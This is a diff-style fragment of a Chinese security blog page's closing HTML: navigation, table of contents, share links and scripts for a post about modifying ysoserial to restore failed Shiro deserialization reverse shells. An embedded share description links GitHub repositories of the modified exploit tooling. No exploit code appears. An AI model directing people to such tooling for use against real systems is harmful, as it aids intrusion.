+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B9%8B%E5%89%8D%E6%89%93%E4%B8%8D%E9%80%9A%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">为什么之前打不通？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%8E%9F%E7%94%9FSocket-shell"><span class="toc-number">2.</span> <span class="toc-text">java原生Socket_shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A4%8D%E5%85%A5%E4%BB%A3%E7%A0%81%E9%97%AE%E9%A2%98-%E5%A6%82%E6%9E%9C%E5%8F%AA%E7%9C%8B%E7%BB%93%E6%9E%9C%E5%8F%AF%E4%BB%A5%E8%B7%B3%E8%BF%87%E8%BF%99%E4%B8%80%E6%AE%B5"><span class="toc-number">3.</span> <span class="toc-text">植入代码问题(如果只看结果可以跳过这一段)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%98%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">优化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%84%9F%E8%A7%A6"><span class="toc-number">5.</span> <span class="toc-text">感触</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&text=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&is_video=false&description=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JAVA4-改写ysoserial解决常规shell失效问题&body=Check out this article: http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&title=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&name=JAVA4-改写ysoserial解决常规shell失效问题&description=&lt;p&gt;最近项目中碰到了两个shiro反序列化，能出网反弹shell失败的情况，和公司师傅请教了一下，豁然开朗，修改了一下ysoserial的一些源码，也成功打通了&lt;br&gt;改动的仓库&lt;a href=&#34;https://github.com/Kit4y/shuyu-ysoserial&#34;&gt;https://github.com/Kit4y/shuyu-ysoserial&lt;/a&gt;&lt;br&gt;打包版本&lt;a href=&#34;https://github.com/Kit4y/Awesome_shiro/tree/master/shiro_shuyu&#34;&gt;https://github.com/Kit4y/Awesome_shiro&amp;#x2F;tree&amp;#x2F;master&amp;#x2F;shiro_shuyu&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;为什么之前打不通？&#34;&gt;&lt;a href=&#34;#为什么之前打不通？&#34; class=&#34;headerlink&#34; title=&#34;为什么之前打不通？&#34;&gt;&lt;/a&gt;为什么之前打不通？&lt;/h2&gt;&lt;p&gt;两次项目均是这种情况，可以出网，可以反弹shell,但是命令执行就是没有回显&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/06/17/JAVA4-%E6%94%B9%E5%86%99ysoserial%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%84shell%E5%A4%B1%E6%95%88%E9%97%AE%E9%A2%98/&t=JAVA4-改写ysoserial解决常规shell失效问题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bkfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
